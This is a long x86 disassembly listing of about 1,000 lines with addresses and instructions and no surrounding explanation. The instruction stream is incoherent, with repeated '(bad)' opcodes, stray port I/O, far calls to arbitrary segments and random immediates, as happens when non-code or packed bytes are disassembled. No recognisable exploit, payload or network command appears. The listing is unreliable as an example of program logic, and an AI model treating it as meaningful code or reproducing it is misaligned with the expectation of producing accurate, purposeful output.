  495d43:	ret    0x338f
  495d46:	push   eax
  495d47:	test   al,0x15
  495d49:	and    ch,bh
  495d4b:	test   DWORD PTR ds:0x6fb13414,0x13e3bf33
  495d55:	sbb    dh,BYTE PTR [ecx+0x48531347]
  495d5b:	sbb    eax,0x4d4f62c4
  495d60:	add    al,0xb1
  495d62:	lods   eax,DWORD PTR ds:[esi]
  495d63:	xchg   edi,ebp
  495d65:	mov    edi,0x8225e94
  495d6a:	xlat   BYTE PTR ds:[ebx]
  495d6b:	fcomip st,st(4)
  495d6d:	rol    BYTE PTR [edx+0x5d],cl
  495d70:	push   edi
  495d71:	div    DWORD PTR [edi]
  495d73:	sbb    DWORD PTR [eax+0x5],0x24
  495d77:	scas   eax,DWORD PTR es:[edi]
  495d78:	jb     0x495d3a
  495d7a:	outs   dx,BYTE PTR es:[esi]
  495d7c:	cmovno ebx,edi
  495d7f:	inc    ebx
  495d80:	ret    0x5828
  495d83:	ins    DWORD PTR es:[edi],dx
  495d84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  495d85:	outs   dx,DWORD PTR ds:[esi]
  495d86:	or     BYTE PTR [eax+esi*4-0x3b],0xf7
  495d8b:	(bad)  
  495d8c:	xor    al,BYTE PTR [ebp+0x760b020]
  495d92:	mov    bh,0x9
  495d94:	push   eax
  495d95:	loopne 0x495d9f
  495d97:	out    0x21,eax
  495d99:	xor    eax,0x3997b888
  495d9e:	scas   eax,DWORD PTR es:[edi]
  495d9f:	and    al,ch
  495da1:	sub    cl,BYTE PTR [edi+eiz*2+0x33]
  495da5:	popf   
  495da6:	shl    BYTE PTR ds:0xe7f2bf2a,1
  495dac:	mov    bh,0xb5
  495dae:	cmp    ah,BYTE PTR [ecx+0xa1b0b87]
  495db4:	sub    eax,0x8b39f760
  495db9:	imul   eax,ecx,0x5757626e
  495dbf:	or     al,0xb4
  495dc1:	sub    al,BYTE PTR [eax-0x71]
  495dc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  495dc5:	icebp  
  495dc6:	xchg   BYTE PTR [eax-0x68ca08b7],ch
  495dcc:	in     al,0x50
  495dce:	xchg   esp,eax
  495dcf:	cs inc ebx
  495dd1:	push   es
  495dd2:	aaa    
  495dd3:	sub    BYTE PTR [ecx],al
  495dd5:	mov    eax,ds:0x4b377a5
  495dda:	(bad)  
  495ddb:	(bad)  
  495ddc:	test   DWORD PTR [edi+0x51208fb7],0x4075a91
  495de6:	fisttp WORD PTR [ebp+0x4fceff46]
  495dec:	xor    eax,0x1290ad37
  495df1:	push   ss
  495df2:	(bad)  
  495df3:	pusha  
  495df4:	aaa    
  495df5:	pusha  
  495df6:	jae    0x495def
  495df8:	inc    ebx
  495df9:	out    dx,eax
  495dfa:	push   ds
  495dfb:	out    dx,eax
  495dfc:	jmp    0x312e1703
  495e01:	cmp    BYTE PTR ds:0x35a0a35b,dh
  495e07:	iret   
  495e08:	scas   eax,DWORD PTR es:[edi]
  495e09:	dec    edi
  495e0a:	push   esi
  495e0b:	outs   dx,BYTE PTR ds:[esi]
  495e0c:	sbb    eax,0xd71f4617
  495e11:	es sti 
  495e13:	ror    BYTE PTR [esi+0x3fd7d7d1],0xef
  495e1a:	test   BYTE PTR [ebp-0x70cb8dfb],0xef
  495e21:	sbb    ch,ah
  495e23:	add    bl,BYTE PTR [ecx-0x6db0bbc8]
  495e29:	test   DWORD PTR [ecx-0x17],esp
  495e2c:	aas    
  495e2d:	out    dx,eax
  495e2e:	xor    eax,DWORD PTR [esp+eiz*4+0x14]
  495e32:	loop   0x495e2b
  495e34:	xchg   DWORD PTR [eax+0x25],ebp
  495e37:	add    ebx,DWORD PTR [ebx]
  495e39:	xlat   BYTE PTR ds:[ebx]
  495e3a:	xor    al,0x2b
  495e3c:	sbb    DWORD PTR [edx],ebp
  495e3e:	jbe    0x495e07
  495e40:	(bad)  
  495e41:	cmp    BYTE PTR [esi+0x7701706e],al
  495e47:	xchg   ebx,eax
  495e48:	xor    dl,BYTE PTR [edi]
  495e4a:	retf   
  495e4b:	rcl    BYTE PTR [edx-0x7dddbcdd],0xa0
  495e52:	push   ebp
  495e53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  495e54:	scas   eax,DWORD PTR es:[edi]
  495e55:	rol    BYTE PTR [edx],0x69
  495e58:	mov    cl,0xc7
  495e5a:	xor    al,0xd4
  495e5c:	mov    edx,0x7fef8ab0
  495e61:	add    ecx,DWORD PTR [esi]
  495e63:	fidivr DWORD PTR [eax+0x57]
  495e66:	mov    bh,0x2a
  495e68:	js     0x495e75
  495e6a:	mov    ds:0x675f4743,al
  495e6f:	pop    eax
  495e70:	dec    ecx
  495e71:	xchg   edi,eax
  495e72:	ficom  WORD PTR [edi+0x5a22387e]
  495e78:	mov    DWORD PTR [eax+0x3f],eax
  495e7b:	iret   
  495e7c:	sar    DWORD PTR [eax+0x38c70353],cl
  495e82:	mov    cl,0x19
  495e84:	or     BYTE PTR [ecx-0x31],dl
  495e87:	inc    DWORD PTR [ebx+0x7f3ad2d0]
  495e8d:	scas   eax,DWORD PTR es:[edi]
  495e8e:	sbb    DWORD PTR [edx+ebp*1-0x3d98e8bd],ecx
  495e95:	call   0x662f:0x67aec146
  495e9c:	pusha  
  495e9d:	push   ebp
  495e9e:	shl    DWORD PTR [edi+0x52c0ac5f],0x26
  495ea5:	inc    esp
  495ea6:	(bad)
  495eaa:	cs (bad) 
  495eac:	dec    edi
  495ead:	dec    edx
  495eae:	cmp    cl,BYTE PTR [ecx]
  495eb0:	ja     0x495ea1
  495eb2:	cmp    BYTE PTR [edi+0x35],ah
  495eb5:	xchg   ebx,eax
  495eb6:	sbb    esi,esp
  495eb8:	inc    edx
  495eb9:	mov    esi,0x606030cf
  495ebe:	mov    bl,BYTE PTR [ecx-0x39]
  495ec1:	xor    BYTE PTR [esi],ch
  495ec3:	inc    eax
  495ec4:	sbb    BYTE PTR [edx-0x4e98bd69],cl
  495eca:	test   BYTE PTR ds:0xa8f1fac,0x15
  495ed1:	nop
  495ed2:	hlt    
  495ed3:	arpl   WORD PTR [edi+0x408b5015],bp
  495ed9:	iret   
  495eda:	daa    
  495edb:	shl    al,0x20
  495ede:	mov    al,ds:0x4a2a8dff
  495ee3:	imul   edx,DWORD PTR [edi+0x1b3123ff],0xffffffc2
  495eea:	push   ds
  495eeb:	pop    edi
  495eec:	push   cs
  495eed:	inc    bx
  495eef:	mov    eax,ds:0x4d37070f
  495ef4:	sub    BYTE PTR ds:0x508def92,bl
  495efa:	mov    ah,0xaa
  495efc:	iret   
  495efd:	daa    
  495efe:	cmp    BYTE PTR [eax],0x99
  495f01:	not    BYTE PTR [edi+0x7f]
  495f04:	cmp    BYTE PTR [ecx+0x53],al
  495f07:	cli    
  495f08:	inc    eax
  495f09:	and    bh,0x63
  495f0c:	int    0x34
  495f0e:	mov    ch,0x8d
  495f10:	pop    edi
  495f11:	(bad)  
  495f12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  495f13:	push   0x18
  495f15:	stos   DWORD PTR es:[edi],eax
  495f16:	mov    al,ds:0x684367ef
  495f1b:	adc    dh,BYTE PTR [ebp+0x2620fff]
  495f21:	adc    ecx,DWORD PTR [ebx-0x39]
  495f24:	xor    al,0x5f
  495f26:	sub    BYTE PTR [esi],cl
  495f28:	sub    al,BYTE PTR [ebp+0x4ef34b7]
  495f2e:	cmp    BYTE PTR [eax+0x5f397731],bh
  495f34:	xchg   esi,eax
  495f35:	imul   esp,DWORD PTR [ecx],0x6d
  495f38:	jle    0x495f7e
  495f3a:	xchg   edi,eax
  495f3b:	xchg   edi,eax
  495f3c:	sbb    DWORD PTR [eax],esp
  495f3e:	push   ss
  495f3f:	shl    DWORD PTR [edi],1
  495f41:	pop    eax
  495f42:	adc    eax,0xe747ac24
  495f47:	push   0xe782262c
  495f4c:	adc    DWORD PTR [eax+esi*4+0x3a],esp
  495f50:	xchg   edi,eax
  495f51:	pop    ds
  495f52:	inc    edi
  495f53:	sbb    al,0x4
  495f55:	mov    cl,0x6a
  495f57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  495f58:	pop    ds
  495f59:	pop    ds
  495f5a:	xlat   BYTE PTR ds:[ebx]
  495f5b:	ss inc edx
  495f5d:	dec    edi
  495f5e:	lahf   
  495f5f:	push   ecx
  495f60:	adc    ebx,DWORD PTR [eax]
  495f62:	adc    eax,0x89a12717
  495f67:	jno    0x495fcc
  495f69:	scas   eax,DWORD PTR es:[edi]
  495f6a:	daa    
  495f6b:	and    BYTE PTR [esi-0x78],dl
  495f6e:	sbb    ch,bh
  495f70:	test   BYTE PTR [edi+0x670f59ad],dh
  495f76:	daa    
  495f77:	bound  eax,QWORD PTR [edx+0x73037048]
  495f7d:	pop    ss
  495f7e:	test   DWORD PTR [edx+0xa],ecx
  495f81:	mov    bh,0x46
  495f83:	xchg   DWORD PTR [edx+edi*4],edx
  495f86:	inc    esp
  495f87:	pop    esp
  495f88:	out    0xb7,eax
  495f8a:	pop    eax
  495f8b:	pop    ebx
  495f8c:	pop    ebx
  495f8d:	mov    bl,0x6f
  495f8f:	out    0x8f,eax
  495f91:	push   esi
  495f92:	pusha  
  495f93:	push   eax
  495f94:	dec    ecx
  495f95:	out    0x3f,eax
  495f97:	xchg   ebp,eax
  495f98:	mov    dl,0x56
  495f9a:	(bad)  [edi]
  495f9c:	(bad)  
  495f9d:	mov    bh,0x3
  495f9f:	shl    eax,cl
  495fa1:	je     0x495fd4
  495fa3:	inc    edi
  495fa4:	(bad)  
  495fa5:	xor    ebp,DWORD PTR [ebx+eiz*4-0x20b0d3ac]
  495fac:	and    BYTE PTR [esi-0x7810e4f7],ah
  495fb2:	inc    edx
  495fb3:	inc    esi
  495fb4:	sbb    ch,BYTE PTR [ecx-0x75f838c0]
  495fba:	pop    eax
  495fbb:	and    eax,0xd683332d
  495fc0:	adc    BYTE PTR [ecx+0x27],0xf3
  495fc4:	xor    al,0x36
  495fc6:	pop    eax
  495fc7:	test   eax,0x92226b1f
  495fcc:	jne    0x49601a
  495fce:	out    dx,eax
  495fcf:	xor    DWORD PTR [edi+0x43],ecx
  495fd2:	dec    ebx
  495fd3:	mov    ss,WORD PTR [eax]
  495fd5:	div    BYTE PTR [ebx]
  495fd7:	xchg   edx,eax
  495fd8:	mov    ah,0xa5
  495fda:	push   es
  495fdb:	out    dx,eax
  495fdc:	dec    edi
  495fdd:	rcr    BYTE PTR [edx],0xd
  495fe0:	sub    al,0x97
  495fe2:	out    0x26,eax
  495fe4:	inc    esi
  495fe5:	add    ebx,DWORD PTR [edi+0x2834e7af]
  495feb:	and    al,0x85
  495fed:	lds    ebx,FWORD PTR [edi-0x7f2c3e81]
  495ff3:	loopne 0x496026
  495ff5:	mov    edi,0x1bc1bfaf
  495ffa:	and    DWORD PTR [edi+0x43],ebx
  495ffd:	add    BYTE PTR [ebx+edi*1-0x41],al
  496001:	xor    eax,0xbf58ade1
  496006:	sub    ebp,DWORD PTR [edi-0x7d4eecaa]
  49600c:	aas    
  49600d:	pop    edi
  49600e:	(bad)  
  49600f:	sub    eax,0x9fff0b13
  496014:	scas   al,BYTE PTR es:[edi]
  496015:	ret    
  496016:	push   edx
  496017:	mov    al,BYTE PTR [edi+0x57]
  49601a:	inc    ebx
  49601b:	inc    eax
  49601c:	xchg   BYTE PTR [edx],al
  49601e:	push   ss
  49601f:	pop    ss
  496020:	cmp    DWORD PTR [edx],eax
  496022:	xor    DWORD PTR [esi],eax
  496024:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  496025:	push   edi
  496026:	add    eax,0xb71406b3
  49602b:	scas   eax,DWORD PTR es:[edi]
  49602c:	test   al,0x58
  49602e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49602f:	test   al,0xf
  496031:	pop    ds
  496032:	xchg   edx,eax
  496033:	push   esi
  496034:	rol    DWORD PTR [edi+ebx*2+0xa],cl
  496038:	and    eax,0x348feae0
  49603d:	push   edi
  49603e:	ins    DWORD PTR es:[edi],dx
  49603f:	test   DWORD PTR [esi],ecx
  496041:	xchg   esp,eax
  496042:	mov    bh,0x6f
  496044:	aas    
  496045:	rcr    BYTE PTR [edx+0x69572065],0xdd
  49604c:	mov    bl,BYTE PTR [ebx]
  49604e:	out    0xfe,eax
  496050:	and    edx,DWORD PTR [ebp-0x65]
  496053:	pop    edx
  496054:	mov    edi,0x7258dd87
  496059:	add    BYTE PTR [esi],dl
  49605b:	xor    edi,eax
  49605d:	inc    edx
  49605e:	push   ebp
  49605f:	add    BYTE PTR [eax],dh
  496061:	xor    DWORD PTR [edi],edx
  496063:	pop    ss
  496064:	push   esi
  496065:	adc    al,0xb6
  496067:	aaa    
  496068:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  496069:	stos   BYTE PTR es:[edi],al
  49606a:	xchg   esi,eax
  49606b:	es push edi
  49606d:	inc    ebx
  49606e:	outs   dx,DWORD PTR ds:[esi]
  49606f:	and    ah,al
  496071:	and    edx,DWORD PTR [edi+0x6f]
  496074:	jg     0x4960cd
  496076:	add    BYTE PTR ds:0x8343a56a,cl
  49607c:	rol    eax,0xa
  49607f:	pop    es
  496080:	lahf   
  496081:	mov    cl,BYTE PTR [eax]
  496083:	jecxz  0x49609f
  496085:	fwait
  496086:	ja     0x496091
  496088:	jmp    0x49602c
  49608a:	mov    al,0x37
  49608c:	cmp    DWORD PTR [eax],ebx
  49608e:	outs   dx,BYTE PTR ds:[esi]
  49608f:	out    dx,eax
  496090:	aas    
  496091:	dec    DWORD PTR [edi]
  496093:	inc    ebp
  496094:	pop    edi
  496095:	xor    dh,BYTE PTR [ecx]
  496097:	rol    DWORD PTR [ecx+0x33cf8737],0x69
  49609e:	dec    eax
  49609f:	inc    ecx
  4960a0:	or     bh,bh
  4960a2:	pop    es
  4960a3:	xchg   edi,eax
  4960a4:	in     al,dx
  4960a5:	fisubr DWORD PTR [eax+0x63419f5e]
  4960ab:	imul   ecx,DWORD PTR [esp+eax*4],0xffffffdb
  4960af:	or     al,0x23
  4960b1:	(bad)  
  4960b2:	repnz inc esi
  4960b4:	lds    ebp,FWORD PTR [edx]
  4960b6:	popa   
  4960b7:	aas    
  4960b8:	addr16 or ebx,esp
  4960bb:	ins    DWORD PTR es:[edi],dx
  4960bc:	mov    al,0xc7
  4960be:	(bad)
  4960c2:	inc    esp
  4960c3:	mov    bh,0x3f
  4960c5:	inc    esp
  4960c6:	sub    eax,DWORD PTR [eax+ebp*2-0x53]
  4960ca:	das    
  4960cb:	pop    ds
  4960cc:	adc    cl,dh
  4960ce:	push   ebp
  4960cf:	shl    bh,1
  4960d1:	xor    al,0x8f
  4960d3:	xor    al,BYTE PTR [ecx+0xb]
  4960d6:	sbb    eax,0x3f
  4960d9:	push   edx
  4960da:	lds    esi,FWORD PTR [ebx]
  4960dc:	(bad)  
  4960dd:	stos   DWORD PTR es:[edi],eax
  4960de:	das    
  4960df:	ja     0x496091
  4960e1:	xor    eax,0x39571819
  4960e6:	sub    BYTE PTR [edx-0x70d8d74f],dl
  4960ec:	les    esp,FWORD PTR [esi]
  4960ee:	or     DWORD PTR [edi],esi
  4960f0:	pop    edx
  4960f1:	xchg   DWORD PTR [eax+0x35],ecx
  4960f4:	lea    ebp,[ecx]
  4960f6:	xchg   DWORD PTR [ebx],esi
  4960f8:	pop    ds
  4960f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4960fa:	xchg   BYTE PTR [ecx+0x5b],dl
  4960fd:	call   DWORD PTR [edi+0x0]
  496100:	pop    edx
  496101:	ror    DWORD PTR [edx-0x19],0x7
  496105:	sbb    BYTE PTR [eax+0xb],0x74
  496109:	aas    
  49610a:	ja     0x4960ad
  49610c:	adc    DWORD PTR [eax-0x45483cca],0x87444c4c
  496116:	xor    al,0xff
  496118:	dec    esp
  496119:	stos   DWORD PTR es:[edi],eax
  49611a:	sbb    dl,ah
  49611c:	iret   
  49611d:	push   edi
  49611e:	mov    bh,0x6e
  496120:	add    ebx,DWORD PTR [edx]
  496122:	xchg   edi,eax
  496123:	cs xor eax,0x8f402284
  496129:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49612a:	aad    0x65
  49612c:	jecxz  0x49613a
  49612e:	xor    ecx,DWORD PTR [edi-0x16]
  496131:	stos   BYTE PTR es:[edi],al
  496132:	push   es
  496133:	mov    al,ds:0xb64437af
  496138:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  496139:	and    ah,BYTE PTR [edi+0x41]
  49613c:	inc    edi
  49613d:	push   0x248b424
  496142:	xchg   DWORD PTR [edi],esp
  496144:	(bad)  
  496145:	sub    eax,0xe72f3465
  49614a:	adc    eax,0x36e498c1
  49614f:	cmp    BYTE PTR [edi-0x15],dl
  496152:	and    BYTE PTR [ebp+0x42974f2d],0x11
  496159:	mov    eax,ds:0x18bfff19
  49615e:	or     esp,DWORD PTR [edx]
  496160:	lea    esp,[edi]
  496162:	or     al,BYTE PTR [ebp-0x26]
  496165:	mov    al,0x33
  496167:	aas    
  496168:	iret   
  496169:	shr    DWORD PTR [esi-0x64e8ebfa],0xa7
  496170:	test   ebx,ebx
  496172:	ins    DWORD PTR es:[edi],dx
  496173:	push   0xffffffc3
  496175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  496176:	mov    ch,0x1d
  496178:	sar    BYTE PTR [edx],1
  49617a:	movntq QWORD PTR [edi+0x5],mm5
  49617e:	add    bh,BYTE PTR [ebx]
  496180:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  496181:	mov    edi,DWORD PTR [ebx]
  496183:	mov    ch,0xb9
  496185:	rcr    DWORD PTR [edi-0x374cb0dd],1
  49618b:	xor    esp,ebx
  49618d:	push   0x334f0a47
  496192:	lods   al,BYTE PTR ds:[esi]
  496193:	adc    al,BYTE PTR [eax]
  496195:	push   esi
  496196:	test   esp,0x47356045
  49619c:	xlat   BYTE PTR ds:[ebx]
  49619d:	inc    ebp
  49619e:	ret    
  49619f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4961a0:	arpl   WORD PTR [edi+eax*2-0x9],si
  4961a4:	push   0x1f
  4961a6:	pop    esp
  4961a7:	dec    eax
  4961a8:	adc    DWORD PTR ds:0xdd3233af,0xffffff9a
  4961af:	adc    DWORD PTR [ebp+0x5bc33ea7],0x8b2f60db
  4961b9:	ret    
  4961ba:	scas   eax,DWORD PTR es:[edi]
  4961bb:	cmp    al,0x24
  4961bd:	les    edx,FWORD PTR [ecx]
  4961bf:	inc    ebp
  4961c0:	fild   QWORD PTR [edi+0x705a4316]
  4961c6:	lahf   
  4961c7:	xlat   BYTE PTR ds:[ebx]
  4961c8:	or     bl,BYTE PTR [eax]
  4961ca:	pop    esp
  4961cb:	xor    ch,bh
  4961cd:	adc    eax,0xc78c4133
  4961d2:	xchg   DWORD PTR [eax+0x2b],esp
  4961d5:	and    al,0x85
  4961d7:	xlat   BYTE PTR ds:[ebx]
  4961d8:	jg     0x49622f
  4961da:	sbb    BYTE PTR [ebp+0x46],0x8f
  4961de:	ja     0x496199
  4961e0:	bound  ebx,QWORD PTR [eax-0x7c]
  4961e3:	inc    ebx
  4961e4:	ja     0x496217
  4961e6:	or     al,0x62
  4961e8:	pop    edx
  4961e9:	and    eax,DWORD PTR [edi]
  4961eb:	or     eax,0x47498707
  4961f0:	xor    al,0x2f
  4961f2:	mov    dh,0x2f
  4961f4:	sub    ch,BYTE PTR [ebp-0x39]
  4961f7:	or     eax,edi
  4961f9:	imul   ebp,DWORD PTR [eax+0x45],0x18b55f30
  496200:	adc    DWORD PTR [edx+0x11b12717],ecx
  496206:	(bad)  
  496207:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  496208:	or     ebp,DWORD PTR [edi]
  49620a:	dec    eax
  49620b:	aad    0xa8
  49620d:	and    BYTE PTR [edi],al
  49620f:	jg     0xf79413e9
  496215:	aaa    
  496216:	cmp    bh,BYTE PTR [edx]
  496218:	mov    WORD PTR [esi+0x4],es
  49621b:	mov    edi,0xc4523753
  496220:	or     dh,BYTE PTR [eax+0x4161513f]
  496226:	stos   DWORD PTR es:[edi],eax
  496227:	pop    es
  496228:	pop    ds
  496229:	or     ecx,DWORD PTR ds:0xe787b561
  49622f:	sbb    eax,0xf1d588f
  496234:	ror    DWORD PTR [edi],cl
  496236:	pop    ebx
  496237:	xchg   DWORD PTR [ecx],eax
  496239:	mov    ebp,0x50879f6f
  49623e:	cmp    al,BYTE PTR [eax+0x68]
  496241:	jg     0x496258
  496243:	lods   al,BYTE PTR ds:[esi]
  496244:	dec    edx
  496245:	mov    ds:0xbe0757df,eax
  49624a:	xor    eax,0xa71a84e9
  49624f:	lahf   
  496250:	inc    esi
  496251:	jb     0x49621c
  496253:	in     eax,0x40
  496255:	xor    eax,0x1a513741
  49625a:	bound  ebx,QWORD PTR [edx-0x51]
  49625d:	inc    ebx
  49625e:	adc    DWORD PTR [ecx-0x7878aadf],esp
  496264:	stos   BYTE PTR es:[edi],al
  496265:	inc    ebp
  496266:	popa   
  496267:	xor    DWORD PTR [edi+0x77],ebx
  49626a:	ret    0xa460
  49626d:	xor    DWORD PTR [edi-0x3553b53d],ecx
  496273:	push   edi
  496274:	mov    edi,0xb4ca870b
  496279:	imul   esp,ebx,0xb7583f2b
  49627f:	mov    al,ds:0xaecf9f1d
  496284:	adc    esp,eax
  496286:	push   0xffffff9f
  496288:	inc    edi
  496289:	xor    bh,BYTE PTR [ebx+0x3f4564a8]
  49628f:	inc    edx
  496290:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  496291:	ret    0x20b8
  496294:	pusha  
  496295:	jmp    DWORD PTR [esp+esi*1+0x5d371b80]
  49629c:	xchg   esp,eax
  49629d:	shr    BYTE PTR [edx+0x27],1
  4962a0:	(bad)  
  4962a1:	ss (bad) 
  4962a3:	mov    al,ds:0x312f35c9
  4962a8:	das    
  4962a9:	mov    ecx,DWORD PTR [ebx+0xf7721c0]
  4962af:	push   cs
  4962b0:	inc    ecx
  4962b1:	mov    edx,DWORD PTR [edx+0x4f]
  4962b4:	das    
  4962b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4962b6:	adc    dl,BYTE PTR [edx]
  4962b8:	xor    eax,DWORD PTR cs:[edi]
  4962bb:	adc    di,dx
  4962be:	inc    esp
  4962bf:	(bad)  
  4962c0:	xor    BYTE PTR [edi+0x28],dh
  4962c3:	sub    al,0xd2
  4962c5:	cdq    
  4962c6:	xor    DWORD PTR [edi],edx
  4962c8:	test   DWORD PTR [ebp+0x67070a16],edx
  4962ce:	prefetchw BYTE PTR [ebx+0xf8fd450]
  4962d5:	retf   0x50d4
  4962d8:	lods   eax,DWORD PTR ds:[esi]
  4962d9:	dec    edi
  4962da:	sbb    DWORD PTR ss:[edi+0xd],ebp
  4962de:	stos   DWORD PTR es:[edi],eax
  4962df:	pop    ds
  4962e0:	neg    DWORD PTR [edi+0x4a214d22]
  4962e6:	out    0x2f,eax
  4962e8:	lea    ecx,[edx]
  4962ea:	leave  
  4962eb:	pop    eax
  4962ec:	ret    0x3df
  4962ef:	xor    eax,0x5f77241a
  4962f4:	mov    al,0x3a
  4962f6:	sub    eax,0x2d6a8769
  4962fb:	add    eax,0x47d7873b
  496300:	or     al,0xe0
  496302:	scas   al,BYTE PTR es:[edi]
  496303:	movsx  esi,WORD PTR [edi]
  496306:	inc    edx
  496307:	pop    ebx
  496308:	int3   
  496309:	inc    eax
  49630a:	call   0xb7ba:0xdbb7a7b7
  496311:	inc    edx
  496312:	push   esi
  496313:	outs   dx,BYTE PTR ds:[esi]
  496314:	or     DWORD PTR [ecx+ebp*1+0x15],ebx
  496318:	pop    edi
  496319:	(bad)  
  49631b:	and    cl,BYTE PTR [ecx-0x2d40c0bb]
  496321:	sbb    BYTE PTR [esi-0x40d0ba1e],dh
  496327:	cmp    DWORD PTR [eax-0x70aed5f2],esi
  49632d:	aas    
  49632e:	push   ebp
  49632f:	inc    ebx
  496330:	pop    eax
  496331:	xchg   ebx,eax
  496332:	outs   dx,DWORD PTR ds:[esi]
  496333:	inc    edi
  496334:	mov    al,0x2a
  496336:	jo     0x4962c1
  496338:	ret    
  496339:	daa    
  49633a:	stos   DWORD PTR es:[edi],eax
  49633b:	(bad)  
  49633c:	add    ch,BYTE PTR [eax-0x7e]
  49633f:	jg     0x496318
  496341:	sub    dl,BYTE PTR [ecx-0x57]
  496344:	adc    DWORD PTR [edi-0x3f4fec71],ebp
  49634a:	(bad)  
  49634b:	pop    edi
  49634c:	push   edi
  49634d:	push   0xf769462c
  496352:	push   0x370ed4d7
  496357:	xlat   BYTE PTR ds:[ebx]
  496358:	xor    BYTE PTR [ebx],ch
  49635a:	adc    esp,DWORD PTR [ebp+0xfb769c1]
  496360:	or     DWORD PTR [esi],ecx
  496362:	pushf  
  496363:	inc    esi
  496364:	dec    edx
  496365:	jg     0x49637f
  496367:	mov    cl,0xe4
  496369:	adc    bh,dh
  49636b:	aaa    
  49636c:	aas    
  49636d:	or     eax,0x39984d60
  496372:	outs   dx,DWORD PTR ds:[esi]
  496373:	lods   eax,DWORD PTR ds:[esi]
  496374:	push   ebp
  496375:	inc    edi
  496376:	fwait
  496377:	mov    edi,0x5d859f7b
  49637c:	aam    0xa
  49637e:	xchg   edi,eax
  49637f:	repz popa 
  496381:	xchg   esi,edx
  496383:	lock imul ecx,edi,0xffffff8f
  496387:	adc    eax,0xcfd258d0
  49638c:	xor    DWORD PTR [edi],edi
  49638e:	add    eax,0x9f61681b
  496393:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  496394:	mov    cl,0x9a
  496396:	ins    BYTE PTR es:[edi],dx
  496397:	arpl   WORD PTR [edi+0x42],dx
  49639a:	pop    eax
  49639b:	mov    eax,0x479f075a
  4963a0:	inc    edx
  4963a1:	pop    edx
  4963a2:	pusha  
  4963a3:	test   bh,al
  4963a5:	push   edx
  4963a6:	sub    edi,DWORD PTR [eax+0x5f353746]
  4963ac:	jo     0x4963f9
  4963ae:	cs mov eax,0x4487410f
  4963b4:	or     bh,BYTE PTR [edx+0x775cb11e]
  4963ba:	inc    ebx
  4963bb:	fistp  QWORD PTR [edi]
  4963bd:	xor    DWORD PTR ds:0x9abf5213,0xe7f96900
  4963c7:	aaa    
  4963c8:	aaa    
  4963c9:	pop    ebx
  4963ca:	jecxz  0x49635e
  4963cc:	xchg   ecx,eax
  4963cd:	out    dx,eax
  4963ce:	test   BYTE PTR [ebx],ch
  4963d0:	lea    ebp,[esi]
  4963d2:	pop    edi
  4963d3:	push   ebx
  4963d4:	pop    edi
  4963d5:	shr    BYTE PTR [eax],cl
  4963d7:	xor    al,BYTE PTR [edi+0x348752e7]
  4963dd:	or     eax,0x15c73677
  4963e2:	ss push ss
  4963e4:	aaa    
  4963e5:	pop    es
  4963e6:	fbstp  TBYTE PTR [ecx]
  4963e8:	test   al,0x54
  4963ea:	and    BYTE PTR [edi+0x6f],0x90
  4963ee:	(bad)  
  4963ef:	mov    al,ds:0xd1abe701
  4963f4:	sbb    ah,al
  4963f6:	xchg   edi,eax
  4963f7:	dec    edi
  4963f8:	push   es
  4963f9:	mov    cl,0x76
  4963fb:	push   edx
  4963fc:	stos   DWORD PTR es:[edi],eax
  4963fd:	pop    ds
  4963fe:	fcom   st(0)
  496400:	push   0xffffffa4
  496402:	inc    edi
  496403:	xchg   esp,eax
  496404:	jl     0x49646f
  496406:	xor    eax,0x54450e97
  49640b:	inc    ebp
  49640c:	sbb    DWORD PTR [edi+0x2b130746],ecx
  496412:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  496413:	lea    ebx,[edi]
  496415:	xor    BYTE PTR [edx+0x779fe028],cl
  49641b:	and    BYTE PTR [eax+0x394f02ab],ch
  496421:	sub    BYTE PTR [ebp-0x2a],dl
  496424:	sub    ah,BYTE PTR [edi+0x581beb9b]
  49642a:	xlat   BYTE PTR ds:[ebx]
  49642b:	and    dh,bh
  49642d:	xchg   DWORD PTR [ecx],eax
  49642f:	enter  0xb556,0xdf
  496433:	out    dx,eax
  496434:	lfs    ebp,FWORD PTR [ebp+0x3f7f2ead]
  49643b:	mov    bh,0x2a
  49643d:	pop    eax
  49643e:	add    ecx,DWORD PTR [esi+0x1aff4f67]
  496444:	mov    al,0x82
  496446:	gs inc ebp
  496448:	aaa    
  496449:	out    dx,eax
  49644a:	test   al,0xd8
  49644c:	popa   
  49644d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49644e:	mov    ds:0x998b0887,eax
  496453:	inc    eax
  496454:	out    dx,eax
  496455:	push   ebp
  496456:	and    DWORD PTR [edx+ecx*2+0x5d21f5f],ebp
  49645d:	and    ecx,DWORD PTR [edi+ebx*1-0x5fbd9cc9]
  496464:	add    ah,bh
  496466:	das    
  496467:	mov    es,ecx
  496469:	dec    ecx
  49646a:	or     esp,DWORD PTR [edi]
  49646c:	lahf   
  49646d:	data16 add ch,bl
  496470:	shl    bh,0x7f
  496473:	sbb    BYTE PTR [edx+0x25],cl
  496476:	cmp    DWORD PTR es:[edi+0x16],ecx
  49647a:	or     DWORD PTR [ebx+0x20e7070e],ebp
  496480:	and    ch,dh
  496482:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  496483:	iret   
  496484:	inc    edx
  496485:	iret   
  496486:	or     cl,BYTE PTR [ecx-0x76]
  496489:	mov    ch,0xbe
  49648b:	inc    edx
  49648c:	dec    eax
  49648d:	dec    esp
  49648e:	shl    BYTE PTR ds:0x565739af,1
  496494:	xchg   ecx,eax
  496495:	mov    al,0x53
